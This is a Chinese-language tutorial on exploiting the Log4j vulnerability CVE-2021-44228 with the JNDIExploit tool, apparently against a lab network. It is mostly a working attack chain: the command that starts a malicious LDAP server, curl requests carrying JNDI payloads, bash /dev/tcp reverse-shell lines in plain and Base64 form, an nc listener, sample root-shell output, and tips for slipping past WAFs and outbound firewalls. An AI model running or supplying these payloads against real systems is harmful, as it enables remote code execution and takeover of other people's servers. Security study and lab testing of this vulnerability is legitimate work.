##  JNDIExploit 的完整工作原理

这条命令是用来**启动 `JNDIExploit` 工具**，用于在目标系统中**利用 Log4j 漏洞（CVE-2021-44228）** 触发 JNDI 加载器漏洞，从而执行远程代码（RCE）。

------

## 🔎 **完整命令解释**

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.109.5
```

| 命令部分                       | 含义               | 解释                                                     |
| ------------------------------ | ------------------ | -------------------------------------------------------- |
| `java`                         | 调用 Java 运行环境 | JNDIExploit 是 Java 编写的工具，需要通过 `java` 命令运行 |
| `-jar`                         | 指定运行 JAR 文件  | 表示要运行一个 JAR 包                                    |
| `JNDIExploit-1.2-SNAPSHOT.jar` | 工具文件           | 表示 JNDIExploit 的 Jar 文件                             |
| `-i 192.168.109.5`             | 设置监听 IP        | 设置 JNDIExploit 监听的 IP 地址（攻击者 IP）             |

------

## 🧠 **JNDIExploit 是什么？**

`JNDIExploit` 是一个用于复现和利用 Log4j 漏洞（CVE-2021-44228）的攻击工具。

- 在 Log4j 漏洞中，目标系统在日志中解析包含 JNDI（Java Naming and Directory Interface）表达式时，可能会自动加载远程类或对象。
- JNDIExploit 工具可以作为一个 **恶意 LDAP/RMI 服务器**，用于伪造恶意对象或命令。
- 目标系统解析 JNDI 请求后，加载 JNDIExploit 服务器提供的对象，从而触发远程代码执行（RCE）。

------

## 🚀 **命令的作用**

这条命令的作用是：

1. 启动一个恶意的 LDAP 服务器
2. 监听在 `192.168.109.5`（即攻击者 IP）
3. 当目标系统访问这个恶意服务器时，JNDIExploit 会返回一个恶意对象
4. 目标系统解析这个对象并触发反弹 Shell 或执行命令

------

## 🎯 **JNDIExploit 完整工作原理**

### 🔥 **1. 启动恶意 LDAP 服务器**

`JNDIExploit` 监听 `192.168.109.5` 的 LDAP 端口（默认是 `1389`）：

```bash
Listening on: ldap://192.168.109.5:1389
```

------

### 🔥 **2. 通过 Log4j 触发漏洞**

- 在目标系统中，通过 Log4j 发送特制的 JNDI Payload：

```bash
curl -G http://192.168.109.4:22220//hello \
--data-urlencode 'payload=${jndi:ldap://192.168.109.5:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4...}'
```

------

### 🔥 **3. 目标系统向 JNDIExploit 服务器发起连接**

- 目标系统会通过 JNDI 请求访问 LDAP 服务器：

```
ldap://192.168.109.5:1389/TomcatBypass/Command/Base64/...
```

------

### 🔥 **4. JNDIExploit 响应并返回恶意对象**

- JNDIExploit 服务器在接收到目标系统的请求后：
  - 加载并返回一个恶意的 `javax.el.ELProcessor` 或 `TomcatBypass` 对象
  - 这个对象中嵌入了反弹 Shell 或其他命令

------

### 🔥 **5. 目标系统加载恶意对象并执行命令**

- 目标系统在解析这个对象后，触发：
   ✅ 反弹 Shell
   ✅ 命令执行
   ✅ 文件写入

------

### 🔥 **6. 反弹 Shell**

- 通过 `bash` 或 `netcat`，将 Shell 反弹到攻击者机器：

```bash
bash -i >& /dev/tcp/192.168.109.5/7777 0>&1
```

------

## 🛠️ **常见 Payload 示例**

### ✅ **使用 `TomcatBypass` 反弹 Shell**

1. 生成 Base64 的反弹 Shell 命令：

```bash
echo -n 'bash -i >& /dev/tcp/192.168.109.5/7777 0>&1' | base64
```

1. 通过 JNDIExploit 触发：

```bash
curl -G http://192.168.109.4:22220//hello \
--data-urlencode 'payload=${jndi:ldap://192.168.109.5:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4...}'
```

------

### ✅ **使用 ELProcessor 执行命令**

1. 使用 ELProcessor 的 Payload 执行命令：

```bash
curl -G http://192.168.109.4:22220//hello \
--data-urlencode 'payload=${jndi:ldap://192.168.109.5:1389/ELProcessor/Command/"bash -i >& /dev/tcp/192.168.109.5/7777 0>&1"}'
```

------

### ✅ **通过 Base64 绕过字符拦截**

- 某些 WAF 或防火墙会拦截特定字符（如 `;`, `|`, `>`）。
- 使用 Base64 进行编码可以有效绕过。

**示例：**

```bash
echo -n 'bash -i >& /dev/tcp/192.168.109.5/7777 0>&1' | base64
```

生成的 Base64：

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwOS41Lzc3NzcgMD4mMQ==
```

------

## ✅ **命令执行成功的标志**

1. 在 JNDIExploit 服务器中，看到类似的日志输出：

```
[+] Received LDAP Query: TomcatBypass/Command/Base64/YmFza...
[+] Sending LDAP ResourceRef result for TomcatBypass/Command...
```

1. 在攻击机上通过 `nc` 监听端口，接收到反弹 Shell：

```bash
nc -lvnp 7777
```

输出：

```
bash: no job control in this shell
root@victim:/#
```

------

## 🚨 **常见问题与解决方法**

| 问题                   | 原因                     | 解决方法                    |
| ---------------------- | ------------------------ | --------------------------- |
| ❌ 没有收到 Shell       | 防火墙阻止出站连接       | 尝试使用 80 或 443 端口     |
| ❌ "Connection Refused" | 目标服务器没有开启防火墙 | 检查网络连接                |
| ❌ LDAP 请求未触发      | JNDI 解析器被禁用        | 确认 Log4j 版本支持 JNDI    |
| ❌ Payload 被拦截       | WAF 拦截                 | 使用 Base64 或 URL 编码绕过 |

------

## 🏆 **完整攻击链总结**

1. 启动 JNDIExploit（监听 LDAP 请求）
2. 通过 Log4j 在目标服务器中发送 JNDI Payload
3. 目标系统解析 LDAP 响应
4. JNDIExploit 发送恶意对象（TomcatBypass/ELProcessor）
5. 目标系统加载并执行命令
6. 成功获取反弹 Shell ✅

------

## 🎯 **最终成功示例**

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.109.5
nc -lvp 7777
```

Payload 示例：

```bash
${jndi:ldap://192.168.109.5:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2...
```

## 